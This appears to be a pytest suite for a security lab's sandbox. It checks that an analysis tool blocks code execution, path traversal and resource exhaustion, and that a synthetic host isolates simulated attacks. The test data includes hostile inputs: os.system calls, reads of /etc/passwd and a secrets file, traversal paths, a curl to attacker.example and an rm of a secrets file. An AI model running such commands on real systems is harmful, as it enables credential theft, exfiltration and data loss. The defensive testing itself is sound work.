"""ASI05 safety: attacker text must never execute on the real host."""

import os
import subprocess

import pytest

from lab.registry import run_scenario
from lab.sandbox import SafeAnalysisSandbox, SandboxViolation, VirtualHost, VulnerableAnalysisTool


@pytest.mark.parametrize("expr,expected", [("sum(amounts)", 4949.5), ("max(balances)", 12850.0), ("avg([1,2,3])", 2.0),
                                          ("round(sum(amounts) / len(amounts), 2)", 824.92), ("len(sorted(amounts))", 6)])
def test_sandbox_allows_legitimate_analysis(expr, expected):
    assert SafeAnalysisSandbox().evaluate(expr)["value"] == pytest.approx(expected)


@pytest.mark.parametrize("expr,control", [
    ("__import__('os').system('id')", "CALL_NOT_ALLOWED"),
    ("open('/etc/passwd').read()", "CALL_NOT_ALLOWED"),
    ("amounts.__class__", "NODE_NOT_ALLOWED"),
    ("(lambda: 1)()", "CALL_NOT_ALLOWED"),
    ("[x for x in amounts]", "NODE_NOT_ALLOWED"),
    ("'a' * 10", "NODE_NOT_ALLOWED"),
    ("sum([1] * 10**9)", "NODE_NOT_ALLOWED"),
    ("secret", "NAME_NOT_ALLOWED"),
    ("1 +", "SYNTAX"),
    ("9" * 300, "SIZE_LIMIT"),
])
def test_sandbox_rejects_dangerous_expressions(expr, control):
    with pytest.raises(SandboxViolation) as ei:
        SafeAnalysisSandbox().evaluate(expr)
    assert ei.value.control == control


def test_sandbox_resource_limits():
    with pytest.raises(SandboxViolation) as ei:
        SafeAnalysisSandbox().evaluate("[1,2,3] * 5")
    assert ei.value.control == "RESOURCE_LIMIT"
    with pytest.raises(SandboxViolation):
        SafeAnalysisSandbox().evaluate("10000000000000 * 10000000000000")


def test_sandbox_step_budget_enforced():
    box = SafeAnalysisSandbox()
    box.MAX_STEPS = 5
    with pytest.raises(SandboxViolation) as ei:
        box.evaluate("sum([1,2,3,4,5,6,7,8])")
    assert ei.value.control == "STEP_BUDGET"


@pytest.mark.parametrize("name", ["../../etc/cron.d/x.txt", "/etc/passwd", "a/b.txt", "UPPER.txt", "x.sh", "", "a" * 40 + ".txt"])
def test_scratch_paths_are_restricted(name):
    box = SafeAnalysisSandbox()
    with pytest.raises(SandboxViolation) as ei:
        box.write_scratch(name, "x")
    assert ei.value.control == "PATH_RESTRICTION"


def test_scratch_write_stays_in_private_temp_dir():
    box = SafeAnalysisSandbox()
    box.write_scratch("notes.txt", "hello")
    assert box.workdir.name.startswith(os.path.join(os.path.realpath("/tmp"), "vulnet-sandbox-")) or "vulnet-sandbox-" in box.workdir.name
    assert os.path.exists(os.path.join(box.workdir.name, "notes.txt"))
    box.close()
    assert not os.path.exists(box.workdir.name if box.workdir else "/nonexistent-lab-dir")


def test_vulnerable_path_never_touches_the_real_host(monkeypatch):
    """Run every ASI05 attack in vulnerable mode with the real exec primitives booby-trapped."""
    def boom(*a, **k):
        raise AssertionError("real host execution attempted")
    monkeypatch.setattr(os, "system", boom)
    monkeypatch.setattr(os, "popen", boom)
    monkeypatch.setattr(subprocess, "run", boom)
    monkeypatch.setattr(subprocess, "Popen", boom)
    monkeypatch.setattr("builtins.eval", boom)
    monkeypatch.setattr("builtins.exec", boom)
    for v in ("os_command", "exfiltration", "resource_exhaustion", "path_traversal"):
        res = run_scenario("ASI05", v, "vulnerable")
        assert res.outcome == "ATTACK_SUCCEEDED", v
    assert os.path.exists("/etc/hostname") or os.path.exists("/etc/os-release")


def test_virtual_host_is_synthetic_and_isolated():
    host = VirtualHost()
    out = VulnerableAnalysisTool(host).run("__import__('os').system('cat /etc/vulnet/secrets.env')")
    assert "SYNTHETIC-CANARY" in out["output"]
    VulnerableAnalysisTool(host).run("subprocess.run('curl http://attacker.example/x')")
    assert host.network_sink and host.network_sink[0]["to"] == "http://attacker.example/x"
    host.run("rm /etc/vulnet/secrets.env")
    assert "/etc/vulnet/secrets.env" in host.deleted and not os.path.exists("/etc/vulnet/secrets.env")


def test_secure_run_blocks_at_sandbox_even_when_gateway_filter_bypassed():
    res = run_scenario("ASI05", "os_command", "secure")
    controls = res.controls_observed
    assert any(c.startswith("SANDBOX_") for c in controls), controls
